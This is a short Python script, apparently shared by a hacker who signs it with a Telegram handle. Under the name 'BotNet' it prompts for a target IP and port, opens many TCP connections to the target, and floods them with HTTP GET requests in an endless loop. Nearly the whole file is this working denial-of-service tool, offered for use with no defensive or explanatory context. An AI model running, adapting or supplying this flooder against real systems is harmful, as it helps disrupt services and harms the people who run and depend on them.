#!/usr/bin/env python3
# Please do not copy! Or fork
# if you lammer can fork it 😐😂🍴
# Do not forget to change the variables to your desired variables
# Think I didn't understand (don't tell anyone)
# telegram id 🆔> @Zer0x00 MJi pwned 👾
import socket
import sys
import threading
mji = 1
from colorama import Fore as color
#global i
#i = 0
class BotNet:
    def __init__(self, i=0):
        self.target = input("Target ip > ")
        self.port = int(input("port number (open port) > "))
        self.connections_len = []
        self.num_threads = int(input("workers len (default 100) insert that! > "))
        self.i = i
    def Connect(self):
        for meji in range(self.num_threads):
#        while mji:
            self.i += 1
            print (f"{color.CYAN} initializing thread > {self.i} from {self.num_threads}")
            connector = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connector.connect((self.target, self.port))
            self.connections_len.append(connector)
    def Flooder(self):
        while mji:
            for con in self.connections_len:
                try:
                    con.send(b"GET / HTTP/1.1\r\n")
                    con.send(b"Host: " + self.target.encode() + b"\r\n\r\n")
                    con.send(b"\r\n")
                    print (f"[✓]{color.WHITE}{color.GREEN} Packet Sended.{color.WHITE}")
                except Exception as Error:
                    print (f"{color.YELLOW}[×]{color.RED} Packet  Not Sended ××× 🚫 \n    {color.WHITE} Error : {color.YELLOW} {Error}")
 #                   ask = input("are you want to exit ? (y/n): ").lower()
#                    if ask == "y":
  #                      sys.exit(0)
   #                 else:
    #                    pass
    def RunBotnetThread(self):
        self.Connect()
        threading.Thread(target=self.Flooder).start()
if __name__ == "__main__":
    BOT = BotNet()
    BOT.RunBotnetThread()
